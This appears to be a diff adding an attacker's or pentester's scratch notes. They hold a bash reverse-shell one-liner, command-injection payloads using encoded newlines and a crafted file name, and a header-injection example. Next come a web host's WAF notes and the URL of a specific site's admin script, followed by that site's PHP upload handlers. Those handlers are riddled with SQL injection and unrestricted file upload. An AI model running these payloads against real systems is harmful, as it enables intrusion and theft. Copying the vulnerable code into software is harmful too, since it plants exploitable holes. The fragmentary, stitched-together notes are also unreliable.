@@ -1,0 +1,229 @@
+bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+
+'1.txt";ls -la #'
+
+
+preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m', $ip)
+
+\r \n
+CR LF
+10 13
+0A 0D URL->
+
+127.0.0.1%0als -la
+127.0.0.1%0dls -la
+127.0.0.1%0a%0dls -la
+
+
+$url = "http://yahoo.com%0a%0dX-PROTECTON:0";
+header("location:$url")
+
+
+godady :
+PHP
+waf : 
+	all php command execution
+	
+	
+
+
+
+https://www.advisors.co/admin/save/saveDownload.php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: M
+ * Date: 1/28/18
+ * Time: 22:48
+ */
+
+include_once("../../includes/dbconnect.php");
+
+
+$id = htmlspecialchars($_GET["ID"]);
+$fileTitle = $_POST['fileTitle'];
+$fileDescription = $_POST['fileDescription'];
+$fileName = '';
+
+
+//echo 'Here is some more debugging info:';
+//print_r($_FILES);
+
+//print "</pre>";
+
+if (isset($_FILES['fileName'])) {
+    $uploaddir = '../../files/downloads/';
+    $uploadfile = $uploaddir . basename($_FILES['fileName']['name']);
+
+//echo '<pre>';
+    if (move_uploaded_file($_FILES['fileName']['tmp_name'], $uploadfile)) {
+//    echo "File is valid, and was successfully uploaded.\n";
+    } else {
+        echo "Possible file upload attack!\n";
+    }
+}
+
+if ($id > 0) {
+
+    if ($fileName == "") {
+        $query = "UPDATE `course` SET 
+                  `fileTitle`='" . $fileTitle . "',
+                  `fileDescription`='" . $fileDescription . "',
+                  `fileName`='" . $fileName . "'
+                  WHERE ID = " . $id;
+    } else {
+        $query = "UPDATE `course` SET 
+                  `fileTitle`='" . $fileTitle . "',
+                  `fileDescription`='" . $fileDescription . "'
+                  WHERE ID = " . $id;
+    }
+
+    if (mysqli_query($link, $query)) {
+        //echo "Records added successfully.";
+    } else {
+        //error
+        echo mysqli_error($connect);
+    }
+
+    mysqli_close($link);
+
+    header("Location: ../adminDownloadList.php");
+
+} else {
+    $query = "INSERT INTO fileDownload (`fileTitle`, `fileDescription`, `fileName`) 
+      VALUES ('" . $fileTitle . "', '" . $fileDescription . "', '" . $fileName . "')";
+
+    if (mysqli_query($link, $query)) {
+        //echo "Records added successfully.";
+    } else {
+        //error
+        echo mysqli_error($connect);
+    }
+
+    mysqli_close($link);
+
+    header("Location: ../adminDownloadList.php");
+}
+
+?>
+
+<br/>
+<button onclick="goBack()">Go Back</button>
+
+<script>
+    function goBack() {
+        window.history.back();
+    }
+</script>
+
+saveImage.php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: M
+ * Date: 6/4/17
+ * Time: 23:05
+ */
+
+include_once("../../includes/dbconnect.php");
+
+$id = htmlspecialchars($_GET["id"]);
+$albumID = htmlspecialchars($_GET["albumID"]);
+$imageDesc = $_POST['imageDesc'];
+$imageTitle = $_POST['imageTitle'];
+$error = 0;
+
+if (isset($_FILES['imagePath'])) {
+    $file_name = $_FILES['imagePath']['name'];
+    $imagePath = $file_name;
+    if ($imagePath <> "") {
+        $file_size = $_FILES['imagePath']['size'];
+        $file_tmp = $_FILES['imagePath']['tmp_name'];
+        $file_type = $_FILES['imagePath']['type'];
+        $name = $_POST['name'];
+        $codes = $_POST['code'];
+
+        $extensions = array("jpeg", "jpg", "png");
+        $file_ext = explode('.', $_FILES['imagePath']['name']);
+        $file_ext = end($file_ext);
+        $file_ext = strtolower(end(explode('.', $_FILES['imagePath']['name'])));
+
+        list($width, $height) = getimagesize($file_tmp);
+
+        /*if ($width != 300 || $height != 200) {
+            echo "Image not in suitable size: " . $width . "x" . $height . " instead of 300x200 pixels.";
+            $error = 1;
+        }*/
+
+        if (in_array($file_ext, $extensions) === false) {
+            echo "extension not allowed";
+            $error = 1;
+        }
+
+        if ($file_size > 524288) {
+            echo 'File size must be less than 512 KB';
+            $error = 1;
+        }
+        if ($error == 0) {
+            move_uploaded_file($file_tmp, "../../images/gallery/" . $file_name);
+        }
+    }
+}
+if ($error == 0) {
+    if ($id > 0) {
+        if ($imagePath == "") {
+            $query = "UPDATE `albumImage` SET 
+                  `imageDesc`='" . $imageDesc . "',
+                  `imageTitle`='" . $imageTitle . "'
+                  WHERE ID = " . $id;
+        } else {
+            $query = "UPDATE `albumImage` SET 
+                  `imageDesc`='" . $imageDesc . "',
+                  `imageTitle`='" . $imageTitle . "',
+                  `imagePath`='" . $imagePath . "'
+                  WHERE ID = " . $id;
+        }
+        if (mysqli_query($link, $query)) {
+            //echo "Records added successfully.";
+        } else {
+            //error
+            echo mysqli_error($connect);
+        }
+
+        mysqli_close($link);
+
+        header("Location: ../adminAlbum.php?ID=" . $albumID);
+
+    } else {
+        $query = "INSERT INTO `albumImage` (imageDesc, `imageTitle`, `imagePath`, albumId)
+      VALUES ('" . $imageDesc . "', '" . $imageTitle . "', '" . $imagePath . "', $albumID)";
+
+        if (mysqli_query($link, $query)) {
+            //echo "Records added successfully.";
+        } else {
+            //error
+            echo mysqli_error($connect);
+        }
+
+        mysqli_close($link);
+
+        header("Location: ../adminAlbum.php?ID=" . $albumID);
+    }
+}
+
+?>
+
+<br/>
+<button onclick="goBack()">Go Back</button>
+
+<script>
+    function goBack() {
+        window.history.back();
+    }
+</script>
+
+	
+
+
+
+
